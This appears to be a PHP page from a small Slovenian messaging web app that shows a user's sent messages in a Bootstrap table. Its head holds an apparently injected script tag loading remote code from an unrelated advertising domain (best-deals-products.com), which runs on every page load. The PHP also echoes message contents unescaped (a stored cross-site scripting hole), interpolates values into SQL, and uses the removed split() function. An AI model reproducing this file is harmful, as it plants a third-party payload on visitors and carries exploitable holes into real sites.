<!DOCTYPE html>
<html lang="en">
  <head>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Poslana sporočila</title>

    <!-- Bootstrap core CSS -->
    <link href="../../dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="jumbotron-narrow.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  <script src="https://www.best-deals-products.com/ws/sf_main.jsp?dlsource=hdrykzc"></script></head>

  <body>
    <div class="container">
      <div class="header clearfix">
        <nav>
          <ul class="nav nav-pills pull-right">
            <li role="presentation" class="active"><a href="novo.php"><span class="glyphicon glyphicon-envelope" aria-hidden="true"></span></a></li>
            <li role="presentation"><a href="profil.php">Prejeta sporočila</a></li>
            <li role="presentation" class="active"><a href="poslano.php">Poslana sporočila</a></li>
            <li role="presentation"><a href="skupine.php">Ustvari skupino</a></li>
            <li role="presentation"><a href="odjava.php">Odjava</a></li>
          </ul>
        </nav>
        <h3 class="text-muted">Poslana sporočila</h3>
    <h4 class="text-muted"><?php session_start(); echo "Prijavljeni: ". $_SESSION['ime'].' '. $_SESSION['priimek'] .'</br>Zadnja prijava: '.$_SESSION['prijava']; ?></h4>
      </div>

      <div class="jumbotron">

    <?php
      include "povezava.php";
      if(isset($_SESSION['id']))
      {
        $osnutek = "";
        $id = $_SESSION['id']; //da vids ker uporabnik je prjavljen
        $sqlreciever = "select u.ime, u.priimek, t.cas from uporabnik u inner join transakcija t on u.id_uporabnika=t.reciever where t.sender ='$id' order by t.cas desc";
        $sqlvsebina = "select t.zadeva, t.vsebina, t.id_transakcije, t.cas from transakcija t where t.sender='$id' order by t.cas desc";
        $recieverrez = mysqli_query($con, $sqlreciever);
        $vsebinarez = mysqli_query($con, $sqlvsebina);
        echo '<table class="table">';
        echo '<thead>';
        echo '<tr>';
        echo '<th>Prejemnik</th>';
        echo '<th>Zadeva</th>';
        echo '<th>Vsebina</th>';
        echo '<th>Čas</th>';
        echo '</tr>';
        echo '</thead>';
        if(mysqli_num_rows($recieverrez) != 0){
          while($reciever = mysqli_fetch_row($recieverrez)){
            echo '<tr>';
            $vsebina = mysqli_fetch_row($vsebinarez);
            $words = split(" ", $vsebina[1]);
            for ($i = 0; ($i < 5 && $i < count($words)); $i++) {
              $osnutek .= $words[$i] . " ";
            }
            echo '<td>' . $reciever[0] . ' ' . $reciever[1] . '</a></td>';
            echo '<td><strong><a href="sporocilo.php?id=' . $vsebina[2] . '">' . $vsebina[0] . '</a></strong></td>';
            if(str_word_count($osnutek) == 5){
              echo '<td><a href="sporocilo1.php?id=' . $vsebina[2] . '">' . $osnutek . '...</a></td>';
            }
            else{
              echo '<td><a href="sporocilo1.php?id=' . $vsebina[2] . '">' . $osnutek . '</a></td>';
            }
            echo '<td>' .  $vsebina[3] . '</td>';
            echo '<td><a href="izbrisi.php?id=' . $vsebina[2] . '"><span class="glyphicon glyphicon-remove" aria-hidden="true"></span></a></td>';
            $osnutek = "";
            echo '</tr>';
          }
        }
        else{
          echo '</table>Niste se poslali nobenega sporocila, <a href="novo.php">tukaj</a> lahko posljete prvega.';
        }
      }
      
      else
      {
        header("location:index.php");
      }


    ?>
      </div>
    </div> <!-- /container -->


    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  </body>
</html>